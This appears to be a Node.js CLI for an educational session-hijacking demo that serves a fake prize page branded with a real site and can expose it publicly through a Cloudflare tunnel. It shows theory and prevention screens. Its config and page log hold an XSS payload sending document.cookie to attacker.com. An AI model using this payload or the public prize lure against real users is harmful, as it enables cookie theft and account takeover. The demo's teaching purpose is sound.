/**
 * ============================================================================
 * SESSION HIJACKING EDUCATIONAL DEMO - MANAGER CLI v1.0
 * ============================================================================
 * Demonstrates how session hijacking works and how to prevent it.
 *
 * Usage: node session-manager.js
 * ============================================================================
 */

const http = require('http');
const readline = require('readline');
const fs = require('fs');
const path = require('path');
const { spawn } = require('child_process');

// ============================================
// ANSI COLOR CODES
// ============================================
const C = {
    reset: '\x1b[0m',
    bright: '\x1b[1m',
    dim: '\x1b[2m',
    red: '\x1b[31m',
    green: '\x1b[32m',
    yellow: '\x1b[33m',
    blue: '\x1b[34m',
    magenta: '\x1b[35m',
    cyan: '\x1b[36m',
    white: '\x1b[37m',
};

// ============================================
// CONFIGURATION
// ============================================
const CONFIG_FILE = path.join(__dirname, 'session-config.json');
const DEFAULT_CONFIG = {
    targetUrl: 'https://www.skool.com',
    targetName: 'Skool',
    maliciousPort: 3003,
    customDomain: '',
    tunnel: 'cloudflared',
    scenarios: [
        {
            id: 'xss-cookie-theft',
            name: 'XSS Cookie Theft',
            type: 'xss',
            payload: '<script>fetch("https://attacker.com/steal?c="+document.cookie)</script>',
            enabled: true,
        },
        {
            id: 'mitm-sniffing',
            name: 'MITM Sniffing',
            type: 'mitm',
            description: 'Intercept unencrypted HTTP traffic',
            enabled: true,
        },
        {
            id: 'session-fixation',
            name: 'Session Fixation',
            type: 'fixation',
            description: 'Force user to use known session ID',
            enabled: true,
        },
        {
            id: 'network-sniffing',
            name: 'Network Sniffing',
            type: 'sniffing',
            description: 'Capture cookies on public WiFi',
            enabled: false,
        },
    ],
};

let config = loadConfig();
let tunnelProcess = null;
let maliciousServer = null;

// ============================================
// CONFIG MANAGEMENT
// ============================================
function loadConfig() {
    try {
        if (fs.existsSync(CONFIG_FILE)) {
            const saved = JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf8'));
            return { ...DEFAULT_CONFIG, ...saved };
        }
    } catch (e) {
        log('warn', 'Could not load config, using defaults.');
    }
    return JSON.parse(JSON.stringify(DEFAULT_CONFIG));
}

function saveConfig() {
    fs.writeFileSync(CONFIG_FILE, JSON.stringify(config, null, 2));
    log('ok', 'Config saved to ' + CONFIG_FILE);
}

// ============================================
// UI HELPERS
// ============================================
function clearScreen() {
    process.stdout.write('\x1Bc');
}

function log(type, msg) {
    const timestamp = new Date().toLocaleTimeString('en-US', { hour12: false });
    const prefix = {
        info:    `${C.cyan}[${timestamp}]${C.reset} ${C.blue}[INFO]${C.reset}`,
        ok:      `${C.cyan}[${timestamp}]${C.reset} ${C.green}[ OK ]${C.reset}`,
        warn:    `${C.cyan}[${timestamp}]${C.reset} ${C.yellow}[WARN]${C.reset}`,
        error:   `${C.cyan}[${timestamp}]${C.reset} ${C.red}[FAIL]${C.reset}`,
        attack:  `${C.cyan}[${timestamp}]${C.reset} ${C.magenta}[HIJACK]${C.reset}`,
        system:  `${C.cyan}[${timestamp}]${C.reset} ${C.white}[SYS ]${C.reset}`,
    }[type] || `[${type}]`;
    console.log(`  ${prefix} ${msg}`);
}

function printBanner() {
    console.log('');
    console.log(`${C.magenta}${C.bright}
 ███████╗███████╗███████╗███████╗██╗ ██████╗ ███╗   ██╗
 ██╔════╝██╔════╝██╔════╝██╔════╝██║██╔═══██╗████╗  ██║
 ███████╗█████╗  ███████╗███████╗██║██║   ██║██╔██╗ ██║
 ╚════██║██╔══╝  ╚════██║╚════██║██║██║   ██║██║╚██╗██║
 ███████║███████╗███████║███████║██║╚██████╔╝██║ ╚████║
 ╚══════╝╚══════╝╚══════╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝${C.reset}`);
    console.log(`${C.dim}  ════════════════════════════════════════════════════════════${C.reset}`);
    console.log(`${C.magenta}${C.bright}  SESSION${C.reset}${C.dim} // Hijacking Demo Manager v1.0${C.reset}`);
    console.log(`${C.dim}  ════════════════════════════════════════════════════════════${C.reset}`);
    console.log('');
}

function printConfig() {
    console.log(`  ${C.cyan}┌─────────────────────────────────────────────────────────────┐${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset} ${C.bright}${C.white}TARGET CONFIG${C.reset}                                                ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}├─────────────────────────────────────────────────────────────┤${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.yellow}▸${C.reset} Target URL:      ${C.bright}${config.targetUrl}${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.yellow}▸${C.reset} Target Name:     ${C.bright}${config.targetName}${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.yellow}▸${C.reset} Malicious Port:  ${C.bright}${config.maliciousPort}${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.yellow}▸${C.reset} Custom Domain:   ${C.bright}${config.customDomain || '(none)'}${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.yellow}▸${C.reset} Tunnel:          ${C.bright}${config.tunnel}${C.reset}`);
    console.log(`  ${C.cyan}├─────────────────────────────────────────────────────────────┤${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset} ${C.bright}${C.white}ATTACK SCENARIOS${C.reset}                                            ${C.cyan}│${C.reset}`);
    config.scenarios.forEach((scenario, i) => {
        const status = scenario.enabled ? `${C.green}● ACTIVE${C.reset}` : `${C.red}○ DISABLED${C.reset}`;
        console.log(`  ${C.cyan}│${C.reset}  ${C.yellow}[${i + 1}]${C.reset} ${scenario.name.padEnd(20)} ${status} ${C.dim}[${scenario.type}]${C.reset}`);
    });
    console.log(`  ${C.cyan}│${C.reset}  ${C.yellow}[${config.scenarios.length + 1}]${C.reset} ${C.bright}+ Add Custom Scenario${C.reset}                                  ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}└─────────────────────────────────────────────────────────────┘${C.reset}`);
    console.log('');
}

function printMenu() {
    console.log(`  ${C.cyan}┌─────────────────────────────────────────────────────────┐${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset} ${C.bright}${C.white}MAIN MENU${C.reset}                                                 ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}├─────────────────────────────────────────────────────────┤${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}                                                         ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[1]${C.reset} 🚀 One-Click Deploy (Server + Tunnel)              ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[2]${C.reset} 🎯 Configure Target URL                            ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[3]${C.reset} ⚙️  Manage Attack Scenarios                       ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[4]${C.reset} 🌐 Domain / Tunnel Setup                         ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[5]${C.reset} 📋 View Current Config                             ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[6]${C.reset} 💾 Save Config                                     ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[7]${C.reset} 📖 Session Hijacking Theory                        ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[8]${C.reset} 🛡️  Prevention Guide                               ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.red}[9]${C.reset} ❌ Terminate Session                               ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}                                                         ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}└─────────────────────────────────────────────────────────┘${C.reset}`);
    console.log('');
}

// ============================================
// MALICIOUS SERVER
// ============================================
function generateMaliciousHTML() {
    const targetUrl = config.targetUrl.replace(/\/$/, '');
    const targetName = config.targetName;

    let scenarioCards = '';
    config.scenarios.forEach((scenario, i) => {
        if (!scenario.enabled) return;
        scenarioCards += `
                <div class="scenario-card">
                    <h4>${scenario.name} [${scenario.type}]</h4>
                    <p>${scenario.description || scenario.payload || 'No description'}</p>
                </div>`;
    });

    return `
        <!DOCTYPE html>
        <html>
        <head>
            <title>🎉 ${targetName} - Special Offer!</title>
            <style>
                body { font-family: Arial, sans-serif; max-width: 800px; margin: 50px auto; padding: 20px; background: #1a1a2e; color: #eee; }
                .prize { background: linear-gradient(135deg, #e94560 0%, #c73e54 100%); color: white; padding: 30px; border-radius: 10px; text-align: center; margin: 20px 0; }
                .prize h2 { font-size: 2em; margin: 10px 0; }
                .scenarios { margin: 20px 0; }
                .scenario-card { background: #16213e; border: 1px solid #0f3460; border-radius: 8px; padding: 15px; margin: 10px 0; }
                .scenario-card h4 { color: #e94560; margin: 0 0 10px 0; }
                .scenario-card p { color: #aaa; font-size: 0.9em; }
                .btn { background: #e94560; color: white; border: none; padding: 15px 30px; font-size: 1.2em; border-radius: 5px; cursor: pointer; margin: 10px; }
                .btn:hover { background: #c73e54; }
                .info-box { background: #16213e; border-left: 4px solid #e94560; padding: 15px; margin: 15px 0; border-radius: 0 5px 5px 0; }
                .warning { background: #fff3cd; border: 2px solid #ffc107; padding: 15px; border-radius: 5px; margin-top: 20px; color: #333; }
                .attack-log { background: #0f3460; color: #00ff88; font-family: 'Courier New', monospace; padding: 15px; border-radius: 5px; margin-top: 20px; font-size: 0.9em; white-space: pre-wrap; }
            </style>
        </head>
        <body>
            <h1>🎉 Congratulations!</h1>
            <div class="prize">
                <h2>🎁 YOU WON A FREE PRIZE! 🎁</h2>
                <p>Click below to claim your reward!</p>
                <button class="btn" onclick="claimPrize()">CLAIM PRIZE</button>
            </div>
            <div class="info-box">
                <strong>🔗 Target:</strong> ${targetName} (${targetUrl})<br>
                <strong>🎯 Scenarios:</strong> ${config.scenarios.filter(s => s.enabled).length}
            </div>
            <div class="scenarios">
                <h3>📦 Attack Scenarios</h3>
                ${scenarioCards}
            </div>
            <div class="warning">
                <h3>🎓 EDUCATIONAL DEMO</h3>
                <p>This page demonstrates session hijacking concepts for educational purposes.</p>
            </div>
            <div class="attack-log" id="log"></div>
            <script>
                const log = document.getElementById('log');
                function addLog(msg) {
                    const time = new Date().toLocaleTimeString();
                    log.textContent += '[' + time + '] ' + msg + '\\n';
                }
                
                addLog('=== SESSION HIJACKING DEMO ===');
                addLog('Target: ${targetUrl}');
                addLog('');
                addLog('This demo shows how session hijacking works.');
                addLog('In a real attack, the attacker would:');
                addLog('  1. Steal your session cookie');
                addLog('  2. Use it to impersonate you');
                addLog('  3. Access your account without password');
                addLog('');
                
                function claimPrize() {
                    addLog('User clicked "CLAIM PRIZE"');
                    addLog('');
                    addLog('In a real XSS attack, this would execute:');
                    addLog('  fetch("https://attacker.com/steal?c="+document.cookie)');
                    addLog('');
                    addLog('But HttpOnly cookies prevent JavaScript access!');
                    addLog('document.cookie is empty: ' + (document.cookie === ''));
                }
            </script>
        </body>
        </html>
    `;
}

function startMaliciousServer() {
    const server = http.createServer((req, res) => {
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end(generateMaliciousHTML());
    });

    server.on('error', (err) => {
        if (err.code === 'EADDRINUSE') {
            log('error', `Port ${config.maliciousPort} is already in use!`);
            log('info', 'Kill the process using that port or change the port in Option 2.');
        } else {
            log('error', 'Server error: ' + err.message);
        }
        process.exit(1);
    });

    server.listen(config.maliciousPort, () => {
        log('attack', 'Session Hijacking demo server deployed!');
        log('info', `Local:    http://localhost:${config.maliciousPort}`);
    });

    return server;
}

// ============================================
// TUNNEL MANAGEMENT
// ============================================
async function startTunnel() {
    const cloudflaredPath = path.join(__dirname, 'cloudflared.exe');

    if (config.tunnel === 'cloudflared') {
        if (!fs.existsSync(cloudflaredPath)) {
            log('error', 'cloudflared not found. Please run the CSRF manager first to download it.');
            return null;
        }
        log('system', 'Starting Cloudflare Tunnel...');
        tunnelProcess = spawn(cloudflaredPath, ['tunnel', '--url', 'http://localhost:' + config.maliciousPort], { stdio: 'pipe' });
    } else {
        log('info', 'No tunnel configured. Using localhost only.');
        return null;
    }

    return new Promise((resolve) => {
        let output = '';
        const timeout = setTimeout(() => {
            log('warn', 'Tunnel timeout - check if it started manually.');
            resolve(null);
        }, 30000);

        tunnelProcess.stdout.on('data', (data) => {
            output += data.toString();
            const urlMatch = output.match(/https:\/\/[a-z0-9-]+\.trycloudflare\.com/i);
            if (urlMatch) {
                clearTimeout(timeout);
                log('ok', `Tunnel URL: ${urlMatch[0]}`);
                resolve(urlMatch[0]);
            }
        });

        tunnelProcess.stderr.on('data', (data) => {
            output += data.toString();
            const urlMatch = output.match(/https:\/\/[a-z0-9-]+\.trycloudflare\.com/i);
            if (urlMatch) {
                clearTimeout(timeout);
                log('ok', `Tunnel URL: ${urlMatch[0]}`);
                resolve(urlMatch[0]);
            }
        });
    });
}

function stopTunnel() {
    if (tunnelProcess) {
        tunnelProcess.kill();
        tunnelProcess = null;
        log('system', 'Tunnel stopped.');
    }
}

// ============================================
// MENU SYSTEM
// ============================================
async function mainMenu() {
    while (true) {
        clearScreen();
        printBanner();
        printConfig();
        printMenu();

        const choice = await ask(`  ${C.green}┌─[${C.reset}${C.bright}SESSION${C.reset}${C.green}]─[${C.reset}${C.bright}manager${C.reset}${C.green}]${C.reset}\n  ${C.green}└─▶${C.reset} `);

        switch (choice.trim()) {
            case '1':
                await oneClickDeploy();
                break;
            case '2':
                await configureTarget();
                break;
            case '3':
                await manageScenarios();
                break;
            case '4':
                await configureTunnel();
                break;
            case '5':
                clearScreen();
                printBanner();
                printConfig();
                await ask(`\n  ${C.dim}Press Enter to continue...${C.reset}`);
                break;
            case '6':
                saveConfig();
                await ask(`\n  ${C.dim}Press Enter to continue...${C.reset}`);
                break;
            case '7':
                showSessionHijackingTheory();
                await ask(`\n  ${C.dim}Press Enter to continue...${C.reset}`);
                break;
            case '8':
                showPreventionGuide();
                await ask(`\n  ${C.dim}Press Enter to continue...${C.reset}`);
                break;
            case '9':
                console.log(`\n  ${C.red}  ⚠️  Terminating session...${C.reset}`);
                stopTunnel();
                if (maliciousServer) maliciousServer.close();
                console.log(`  ${C.dim}  Stay ethical, stay legal.${C.reset}\n`);
                rl.close();
                process.exit(0);
            default:
                log('error', 'Invalid option selected.');
                await ask(`  ${C.dim}Press Enter to try again...${C.reset}`);
        }
    }
}

async function oneClickDeploy() {
    clearScreen();
    printBanner();
    log('system', 'Initiating one-click deployment...');
    console.log('');

    log('system', '[1/3] Starting Session Hijacking demo server...');
    maliciousServer = startMaliciousServer();
    await new Promise(r => setTimeout(r, 1000));

    log('system', '[2/3] Starting tunnel...');
    const tunnelUrl = await startTunnel();

    log('system', '[3/3] Deployment complete!');
    console.log('');

    console.log(`  ${C.cyan}┌─────────────────────────────────────────────────────────┐${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset} ${C.green}${C.bright}✅ DEPLOYMENT COMPLETE${C.reset}                                   ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}├─────────────────────────────────────────────────────────┤${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.yellow}▸${C.reset} Local:    ${C.bright}http://localhost:${config.maliciousPort}${C.reset}                       ${C.cyan}│${C.reset}`);
    if (tunnelUrl) {
        console.log(`  ${C.cyan}│${C.reset}  ${C.yellow}▸${C.reset} Public:   ${C.bright}${tunnelUrl}${C.reset}                       ${C.cyan}│${C.reset}`);
    }
    console.log(`  ${C.cyan}├─────────────────────────────────────────────────────────┤${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.bright}ATTACK SCENARIOS:${C.reset}                                      ${C.cyan}│${C.reset}`);
    config.scenarios.forEach((s, i) => {
        if (!s.enabled) return;
        console.log(`  ${C.cyan}│${C.reset}  ${C.green}[${i + 1}]${C.reset} ${s.name.padEnd(20)} ${C.dim}[${s.type}]${C.reset}              ${C.cyan}│${C.reset}`);
    });
    console.log(`  ${C.cyan}├─────────────────────────────────────────────────────────┤${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.yellow}Press Enter to stop and return to menu${C.reset}                    ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}└─────────────────────────────────────────────────────────┘${C.reset}`);
    console.log('');

    await ask('');
    stopTunnel();
    if (maliciousServer) {
        maliciousServer.close();
        maliciousServer = null;
    }
    log('system', 'Server stopped.');
    console.log('');
}

async function configureTarget() {
    clearScreen();
    printBanner();
    log('system', 'Loading target configuration...');
    console.log('');

    const newTarget = await ask(`  ${C.yellow}▸${C.reset} Target URL [${C.bright}${config.targetUrl}${C.reset}]: `);
    if (newTarget.trim()) {
        config.targetUrl = newTarget.trim().replace(/\/$/, '');
    }

    const newName = await ask(`  ${C.yellow}▸${C.reset} Target Name [${C.bright}${config.targetName}${C.reset}]: `);
    if (newName.trim()) {
        config.targetName = newName.trim();
    }

    const newPort = await ask(`  ${C.yellow}▸${C.reset} Malicious Port [${C.bright}${config.maliciousPort}${C.reset}]: `);
    if (newPort.trim() && !isNaN(parseInt(newPort))) {
        config.maliciousPort = parseInt(newPort.trim());
    }

    log('ok', 'Target configuration updated!');
    await ask(`\n  ${C.dim}Press Enter to continue...${C.reset}`);
}

async function manageScenarios() {
    while (true) {
        clearScreen();
        printBanner();
        log('system', 'Loading attack scenarios...');
        console.log('');

        console.log(`  ${C.cyan}┌─────────────────────────────────────────────────────────┐${C.reset}`);
        console.log(`  ${C.cyan}│${C.reset} ${C.bright}${C.white}ATTACK SCENARIOS${C.reset}                                       ${C.cyan}│${C.reset}`);
        console.log(`  ${C.cyan}├─────────────────────────────────────────────────────────┤${C.reset}`);
        
        config.scenarios.forEach((scenario, i) => {
            const status = scenario.enabled ? `${C.green}● ACTIVE${C.reset}` : `${C.red}○ DISABLED${C.reset}`;
            console.log(`  ${C.cyan}│${C.reset}  ${C.green}[${i + 1}]${C.reset} ${scenario.name.padEnd(20)} ${status} ${C.dim}[${scenario.type}]${C.reset}  ${C.cyan}│${C.reset}`);
        });
        
        console.log(`  ${C.cyan}│${C.reset}  ${C.green}[${config.scenarios.length + 1}]${C.reset} ${C.bright}+ Add Custom Scenario${C.reset}                                  ${C.cyan}│${C.reset}`);
        console.log(`  ${C.cyan}│${C.reset}  ${C.green}[${config.scenarios.length + 2}]${C.reset} ← Back to Main Menu                                 ${C.cyan}│${C.reset}`);
        console.log(`  ${C.cyan}└─────────────────────────────────────────────────────────┘${C.reset}`);
        console.log('');

        const choice = await ask(`  ${C.green}┌─[${C.reset}${C.bright}SESSION${C.reset}${C.green}]─[${C.reset}${C.bright}scenarios${C.reset}${C.green}]${C.reset}\n  ${C.green}└─▶${C.reset} `);

        const num = parseInt(choice.trim());
        
        if (num >= 1 && num <= config.scenarios.length) {
            await editScenario(num - 1);
        } else if (num === config.scenarios.length + 1) {
            await addScenario();
        } else if (num === config.scenarios.length + 2) {
            return;
        } else {
            log('error', 'Invalid option.');
            await ask(`  ${C.dim}Press Enter to continue...${C.reset}`);
        }
    }
}

async function addScenario() {
    console.log('');
    log('system', 'Creating new attack scenario...');
    console.log('');

    const name = await ask(`  ${C.yellow}▸${C.reset} Scenario Name: `);
    
    console.log('');
    console.log(`  ${C.cyan}┌─────────────────────────────────────────────────────────┐${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset} ${C.bright}${C.white}SCENARIO TYPE${C.reset}                                         ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}├─────────────────────────────────────────────────────────┤${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[1]${C.reset} XSS Cookie Theft                                  ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[2]${C.reset} MITM Sniffing                                      ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[3]${C.reset} Session Fixation                                   ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[4]${C.reset} Network Sniffing                                   ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}└─────────────────────────────────────────────────────────┘${C.reset}`);
    console.log('');

    const typeChoice = await ask(`  ${C.yellow}▸${C.reset} Select type: `);
    const typeMap = { '1': 'xss', '2': 'mitm', '3': 'fixation', '4': 'sniffing' };
    const type = typeMap[typeChoice.trim()] || 'xss';

    const description = await ask(`  ${C.yellow}▸${C.reset} Description: `);

    config.scenarios.push({
        id: 'scenario-' + Date.now(),
        name: name.trim() || 'Custom Scenario',
        type: type,
        description: description.trim(),
        enabled: true,
    });

    log('ok', 'Scenario added!');
    await ask(`\n  ${C.dim}Press Enter to continue...${C.reset}`);
}

async function editScenario(index) {
    const scenario = config.scenarios[index];
    
    console.log('');
    log('system', 'Editing: ' + scenario.name);
    console.log('');

    const name = await ask(`  ${C.yellow}▸${C.reset} Name [${scenario.name}]: `);
    if (name.trim()) scenario.name = name.trim();

    const enabled = await ask(`  ${C.yellow}▸${C.reset} Enabled? (y/n) [${scenario.enabled ? 'y' : 'n'}]: `);
    if (enabled.trim().toLowerCase() === 'y') scenario.enabled = true;
    if (enabled.trim().toLowerCase() === 'n') scenario.enabled = false;

    const description = await ask(`  ${C.yellow}▸${C.reset} Description [${scenario.description || ''}]: `);
    if (description.trim()) scenario.description = description.trim();

    log('ok', 'Scenario updated!');
    await ask(`\n  ${C.dim}Press Enter to continue...${C.reset}`);
}

async function configureTunnel() {
    clearScreen();
    printBanner();
    log('system', 'Loading tunnel configuration...');
    console.log('');

    console.log(`  ${C.cyan}┌─────────────────────────────────────────────────────────┐${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset} ${C.bright}${C.white}TUNNEL CONFIGURATION${C.reset}                                   ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}├─────────────────────────────────────────────────────────┤${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[1]${C.reset} Cloudflare Tunnel (No account needed)              ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[2]${C.reset} Custom Domain (Your own domain)                    ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[3]${C.reset} No Tunnel (Localhost only)                        ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}│${C.reset}  ${C.green}[4]${C.reset} ← Back to Main Menu                             ${C.cyan}│${C.reset}`);
    console.log(`  ${C.cyan}└─────────────────────────────────────────────────────────┘${C.reset}`);
    console.log('');

    const choice = await ask(`  ${C.green}┌─[${C.reset}${C.bright}SESSION${C.reset}${C.green}]─[${C.reset}${C.bright}tunnel${C.reset}${C.green}]${C.reset}\n  ${C.green}└─▶${C.reset} `);

    switch (choice.trim()) {
        case '1':
            config.tunnel = 'cloudflared';
            log('ok', 'Cloudflare Tunnel selected.');
            break;
        case '2':
            config.tunnel = 'custom';
            const domain = await ask(`  ${C.yellow}▸${C.reset} Enter your domain: `);
            if (domain.trim()) {
                config.customDomain = domain.trim().replace(/^https?:\/\//, '').replace(/\/$/, '');
                log('ok', 'Custom domain set: ' + config.customDomain);
            }
            break;
        case '3':
            config.tunnel = 'none';
            log('ok', 'Tunnel disabled. Localhost only.');
            break;
        case '4':
            return;
    }

    await ask(`\n  ${C.dim}Press Enter to continue...${C.reset}`);
}

function showSessionHijackingTheory() {
    clearScreen();
    printBanner();
    console.log(`
  ${C.cyan}┌─────────────────────────────────────────────────────────────┐${C.reset}
  ${C.cyan}│${C.reset} ${C.bright}${C.white}📖 SESSION HIJACKING THEORY${C.reset}                              ${C.cyan}│${C.reset}
  ${C.cyan}├─────────────────────────────────────────────────────────────┤${C.reset}
  ${C.cyan}│${C.reset}                                                             ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  ${C.yellow}WHAT IS SESSION HIJACKING?${C.reset}                                ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  Stealing a user's session token to impersonate them.       ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}                                                             ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  ${C.bright}HOW IT WORKS:${C.reset}                                          ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}                                                             ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  ${C.green}[1]${C.reset} User logs in → Server creates session cookie        ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  ${C.green}[2]${C.reset} Attacker steals cookie (XSS, MITM, etc.)           ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  ${C.green}[3]${C.reset} Attacker uses cookie → Server thinks it's the user  ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}                                                             ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  ${C.bright}ATTACK VECTORS:${C.reset}                                       ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}                                                             ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  ${C.green}[1]${C.reset} ${C.bright}XSS${C.reset} - Inject script to read document.cookie     ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  ${C.green}[2]${C.reset} ${C.bright}MITM${C.reset} - Intercept unencrypted HTTP traffic      ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  ${C.green}[3]${C.reset} ${C.bright}Network Sniffing${C.reset} - Capture cookies on public WiFi  ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  ${C.green}[4]${C.reset} ${C.bright}Session Fixation${C.reset} - Force known session ID      ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  ${C.green}[5]${C.reset} ${C.bright}Malware${C.reset} - Browser malware steals cookies         ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}                                                             ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  ${C.red}IMPACT:${C.reset}                                                  ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  - Full account takeover                                  ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  - Access to personal data                                 ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  - Financial fraud                                        ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}                                                             ${C.cyan}│${C.reset}
  ${C.cyan}└─────────────────────────────────────────────────────────────┘${C.reset}
`);
}

function showPreventionGuide() {
    clearScreen();
    printBanner();
    console.log(`
  ${C.cyan}┌─────────────────────────────────────────────────────────────┐${C.reset}
  ${C.cyan}│${C.reset} ${C.bright}${C.white}🛡️  SESSION HIJACKING PREVENTION${C.reset}                        ${C.cyan}│${C.reset}
  ${C.cyan}├─────────────────────────────────────────────────────────────┤${C.reset}
  ${C.cyan}│${C.reset}                                                             ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  ${C.green}[1]${C.reset} HTTP-ONLY COOKIES ⭐ (Best Defense)                  ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}     - JavaScript cannot read cookie                      ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}     - Set-Cookie: session=xxx; HttpOnly                  ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}     - Prevents XSS cookie theft                           ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}                                                             ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  ${C.green}[2]${C.reset} SECURE FLAG                                           ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}     - Cookie only sent over HTTPS                         ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}     - Set-Cookie: session=xxx; Secure                    ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}     - Prevents MITM sniffing                              ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}                                                             ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  ${C.green}[3]${C.reset} SAMESITE ATTRIBUTE                                    ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}     - Cookie not sent with cross-site requests           ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}     - Set-Cookie: session=xxx; SameSite=Strict         ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}     - Prevents CSRF and some session hijacking           ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}                                                             ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  ${C.green}[4]${C.reset} SHORT SESSION EXPIRY                                  ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}     - Sessions expire quickly (15-30 min)                 ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}     - Reduces window of opportunity                      ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}                                                             ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  ${C.green}[5]${C.reset} SESSION ROTATION                                     ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}     - Regenerate session ID after login                  ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}     - Prevents session fixation                          ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}                                                             ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  ${C.green}[6]${C.reset} BIND TO IP/USER-AGENT                               ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}     - Validate session against client fingerprint        ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}     - Harder to reuse stolen cookies                     ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}                                                             ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}  ${C.yellow}DEFENSE IN DEPTH: Use multiple layers!${C.reset}                    ${C.cyan}│${C.reset}
  ${C.cyan}│${C.reset}                                                             ${C.cyan}│${C.reset}
  ${C.cyan}└─────────────────────────────────────────────────────────────┘${C.reset}
`);
}

// ============================================
// CLI HELPERS
// ============================================
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
});

function ask(question) {
    return new Promise(resolve => rl.question(question, resolve));
}

// ============================================
